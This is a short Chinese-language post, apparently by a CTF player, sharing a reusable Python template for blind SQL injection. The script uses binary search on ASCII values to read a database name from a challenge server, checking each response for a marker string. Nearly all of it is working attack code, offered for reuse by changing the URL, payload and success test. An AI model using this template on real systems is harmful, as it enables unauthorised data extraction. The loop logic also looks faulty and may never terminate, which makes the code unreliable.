每次做sql注入的题目都要自己重写一遍脚本很麻烦，其实写好框架换payload就可以了，在此记录一些可以套的模板

sql注入二分法：

import requests
s = requests.session()
url = "http://b610204e-01f9-45af-85d8-bc935b33bc72.node3.buuoj.cn/index.php"
flag = ""

def exp(i,j):
	payload = "1^(ascii(mid((select database()),{},1))>{})^1".format(i,j)
	data = dict(id=payload)
	res = s.post(url=url,data=data)
	if "Nu1L" in res.text:
		return True
	else:
		return False

for i in range(1,100):
	low = 32
	high =127
	mid = (low+high)//2
	while(low<=high):
		if (exp(i,mid)):
			low = mid+1 
		else:
			high = mid
		mid = (low+high)//2
	flag += chr(mid)
	print(flag)

二分法会比普通的字符比较跑的更快一些，用的时候只要把payload和url还有判断条件改一改就好了。

                }
